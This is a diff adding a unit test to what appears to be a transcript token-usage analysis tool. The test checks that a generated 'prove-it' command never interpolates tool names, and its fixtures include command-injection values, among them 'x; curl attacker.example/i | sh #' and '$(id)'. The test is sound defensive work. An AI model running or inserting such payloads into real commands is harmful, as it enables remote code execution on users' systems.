@@ -111,3 +111,12 @@ test('recommendations are sorted by severity (high first, info last)', () => {
 test('THRESHOLDS are exported for tuning/inspection', () => {
   assert.ok(THRESHOLDS.toolBloatBytes > 0);
 });
+
+test('tool-bloat never embeds the (transcript-derived) tool name in the prove-it command', () => {
+  for (const name of ['Read', 'x; curl attacker.example/i | sh #', '$(id)', '`id`', 'a\nb']) {
+    const ledger = makeLedger({ byTool: [{ name, contextBytes: 60000, calls: 1 }] });
+    const bloat = recommend(ledger, null).find((r) => r.kind === 'tool-bloat');
+    assert.ok(bloat, `tool-bloat fires for ${JSON.stringify(name)}`);
+    assert.equal(bloat.evalCmd, 'tokenomics eval --before <a>.jsonl --after <b>.jsonl');
+  }
+});
